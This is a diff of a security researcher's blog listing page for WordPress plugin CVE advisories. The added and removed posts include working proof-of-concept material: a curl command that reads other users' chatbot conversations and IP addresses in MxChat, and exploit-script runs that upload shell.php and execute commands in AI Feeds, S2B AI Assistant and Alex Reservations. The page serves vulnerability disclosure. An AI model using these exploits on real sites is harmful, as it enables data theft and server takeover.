@@ -277,6 +277,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -301,19 +303,19 @@
                             </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12720/">g-FFL Cockpit &lt;= 1.7.1 - Improper Authorization to Unauthenticated Product Deletion</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
                             </li>
                         
                             <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13390/">WP Directory Kit &lt;= 1.4.4 - Authentication Bypass to Privilege Escalation via Account Takeover</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12585/">MxChat – AI Chatbot for WordPress &lt;= 2.5.5 - Unauthenticated Information Exposure</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
                             </li>
                         
                     
@@ -324,6 +326,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -427,6 +431,156 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-12585/">MxChat – AI Chatbot for WordPress &lt;= 2.5.5 - Unauthenticated Information Exposure</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-12-02T00:01:00Z" class="post-date">
+        December 2, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-MxChat">
+        <a href="https://ryankozak.com/tags/mxchat">MxChat</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-12585">CVE-2025-12585</h3>
+<p>The <a href="https://wordpress.org/plugins/mxchat-basic/" target="_blank">MxChat Basic</a> plugin does not verify session ownership in the <code>mxchat_fetch_conversation_history</code> AJAX endpoint, allowing unauthenticated users to access other users&rsquo; conversation history and IP addresses through Insecure Direct Object Reference (IDOR) vulnerabilities.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET_SITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://example.com&#34;</span>
+</span></span><span style="display:flex;"><span>SESSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mxchat_chat_7jxi3jsdb&#34;</span>
+</span></span><span style="display:flex;"><span>NONCE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s $TARGET_SITE | grep -oP <span style="color:#e6db74">&#39;nonce[&#34;\047]:\s*[&#34;\047]\K[^&#34;\047]+&#39;</span> | head -1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>curl -X POST $TARGET_SITE/wp-admin/admin-ajax.php <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;action=mxchat_fetch_conversation_history&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;session_id=</span>$SESSION_ID<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;nonce=</span>$NONCE<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;X-Requested-With: XMLHttpRequest&#34;</span> | jq
+</span></span></code></pre></div><h2 id="details">Details</h2>
+<p>The <a href="https://plugins.trac.wordpress.org/browser/mxchat-basic/trunk/includes/class-mxchat-integrator.php#L107" target="_blank"><code>mxchat_fetch_conversation_history()</code></a> function in <code>/includes/class-mxchat-integrator.php</code> file retrieves conversation data based solely on a client-provided <code>session_id</code> without verifying that the requester owns the session. This allows any unauthenticated user with a valid nonce (available via frontend JavaScript) to access other users&rsquo; private conversation data. Additionally, the conversation history includes user IP addresses stored in the <code>agent_name</code> field, which are disclosed alongside the conversation data.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-12585/">Read More…</a>
+        </div>
+        
+        
+    </article>
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-11-25T00:01:00Z" class="post-date">
+        November 25, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-AI Feeds">
+        <a href="https://ryankozak.com/tags/ai-feeds">AI Feeds</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-13597">CVE-2025-13597</h3>
+<p>The <a href="https://wordpress.org/plugins/ai-feeds/" target="_blank">AI Feeds</a> WordPress plugin versions 1.0.11 and below contain an unauthenticated remote code execution vulnerability in the <code>actualizador_git.php</code> file. This file is directly accessible via HTTP without any authentication or authorization checks, allowing unauthenticated attackers to download arbitrary GitHub repositories and overwrite plugin files, leading to remote code execution.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<p>A <a href="https://github.com/d0n601/CVE-2025-13597/blob/master/CVE-2025-13597.py" target="_blank">exploit.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
+<pre tabindex="0"><code>python3 CVE-2025-13597.py -t http://techcorp.cc -o d0n601 -r minimal-rce -k github_pat_YOURKEY -c whoami
+[*] Exploiting actualizador_git.php vulnerability...
+[*] Downloading and installing shell from GitHub repository: d0n601/minimal-rce
+Descargando d0n601/minimal-rce@main ...
+Eliminando entradas extra...
+Copiando archivos...
+OK. Mirror aplicado en: /var/www/html/wp-content/plugins/ai-feeds
+
+[*] Exploit executed. Checking if shell.php was created...
+
+[*] Testing shell access...
+www-data
+
+
+[*] Shell should be accessible at:
+    http://techcorp.cc/wp-content/plugins/ai-feeds/shell.php?cmd=COMMAND
+</code></pre><h2 id="technical-analysis">Technical Analysis</h2>
+<p>The vulnerability exists in <code>/wp-content/plugins/ai-feeds/actualizador_git.php</code>. This file implements a GitHub repository mirroring system that can be accessed directly via HTTP without any security controls.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-13597/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -663,148 +817,6 @@ www-data
         
         
     </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-12973/">S2B AI Assistant – ChatBot, ChatGPT, OpenAI, Content &amp; Image Generator &lt;= 1.7.8 - Authenticated (Editor&#43;) Arbitrary File Upload</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-11-20T00:01:00Z" class="post-date">
-        November 20, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-S2B AI Assistant">
-        <a href="https://ryankozak.com/tags/s2b-ai-assistant">S2B AI Assistant</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-12973">CVE-2025-12973</h3>
-<p>The WordPress <a href="https://wordpress.org/plugins/s2b-ai-assistant" target="_blank">S2B AI Assistant</a> plugin (versions 2.47 and prior) contains an arbitrary file upload vulnerability that allows authenticated WordPress users with Editor role or higher to upload malicious PHP files to the server, potentially leading to remote code execution.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<p>A POC <a href="https://github.com/d0n601/CVE-2025-12973/blob/master/CVE-2025-12973.py" target="_blank">CVE-2025-12973.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
-<pre tabindex="0"><code>python3 ./CVE-2025-12973.py http://techcorp.cc editor $PASSWORD
-[+] Target: http://techcorp.cc
-[+] Username: editor
-[+] Nonce obtained: a15be47119
-[+] File uploaded successfully!
-[+] Shell URL: http://techcorp.cc/wp-content/uploads/2025/11/shell.php
-[+] Command output:
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre><h2 id="technical-description">Technical Description</h2>
-<p>The vulnerability exists in the <code>Utils.php</code> file at the <code>storeFile()</code> method, which is called by the <code>/wp-admin/admin-post.php</code> endpoint with action <code>s2b_store_chatbot_upload</code>. The upload functionality uses a custom file extension whitelist that explicitly allows dangerous file types including PHP files. This allows authenticated WordPress users with Editor role or higher to upload arbitrary files, including PHP files that can be executed on the server.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-12973/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-12399/">Alex Reservations: Smart Restaurant Booking &lt;= 2.2.3 - Authenticated (Admin&#43;) Arbitrary File Upload</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-11-07T00:01:00Z" class="post-date">
-        November 7, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>2 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-Alex Reservations">
-        <a href="https://ryankozak.com/tags/alex-reservations">Alex Reservations</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-12399">CVE-2025-12399</h3>
-<p>The WordPress <a href="https://wordpress.org/plugins/alex-reservations" target="_blank">Alex Reservations</a> plugin (versions 2.2.3 and prior) contains an arbitrary file upload vulnerability that allows authenticated WordPress administrators to upload malicious PHP files to the server, potentially leading to remote code execution.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<p>A POC <a href="https://github.com/d0n601/CVE-2025-12399/blob/master/CVE-2025-12399.py" target="_blank">CVE-2025-12399.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
-<pre tabindex="0"><code>python3 ./CVE-2025-12399.py https://TARGETSITE.com admin &#34;$PASSWORD&#34;                                                                                            
-[+] Target: http://TARGETSITE.com
-[+] Username: admin
-[+] Nonce obtained: 022b25d0a5
-[+] File uploaded successfully!
-[+] Shell URL: https://TARGETSITE.com/wp-content/uploads/alex-reservations/2025/10/shell.php
-[+] Command output:
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-</code></pre><h2 id="technical-description">Technical Description</h2>
-<p>The vulnerability exists in the <code>UploadFileController.php</code> file at the <code>/wp-json/srr/v1/app/upload/file</code> endpoint. The upload functionality lacks proper file validation and only performs basic filename sanitization using a regex pattern. This allows authenticated WordPress administrators to upload arbitrary files, including PHP files that can be executed on the server.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-12399/">Read More…</a>
-        </div>
-        
-        
-    </article>
 </div>
 
 
@@ -858,6 +870,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
     
     
     <a href="/page/11/">11</a>
+    
+    
+    
+    <a href="/page/12/">12</a>
     
     
 
